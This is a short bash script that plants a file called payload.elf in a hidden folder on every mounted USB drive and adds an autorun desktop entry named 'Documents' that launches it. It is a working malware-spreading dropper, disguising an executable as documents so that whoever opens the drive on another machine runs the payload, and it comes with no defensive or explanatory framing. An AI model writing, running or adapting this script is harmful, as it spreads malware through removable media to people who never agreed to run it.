#!/bin/bash

# Create autorun files on USB
PAYLOAD_PATH="$PWD/payload.elf"
TARGET_DIR="/media/$USER/*/"

if [ ! -f "$PAYLOAD_PATH" ]; then
    echo "Payload not found at $PAYLOAD_PATH"
    exit 1
fi

for usb in $TARGET_DIR; do
    if [ -d "$usb" ]; then
        # Create autorun files
        echo "[Desktop Entry]" > "$usb/.autorun.desktop"
        echo "Name=Documents" >> "$usb/.autorun.desktop"
        echo "Exec=$usb/.hidden/payload.elf" >> "$usb/.autorun.desktop"
        echo "Type=Application" >> "$usb/.autorun.desktop"
        
        # Create hidden directory and copy payload
        mkdir -p "$usb/.hidden"
        cp "$PAYLOAD_PATH" "$usb/.hidden/payload.elf"
        
        # Set executable permission
        chmod +x "$usb/.hidden/payload.elf"
        
        echo "Payload installed on $usb"
    fi
done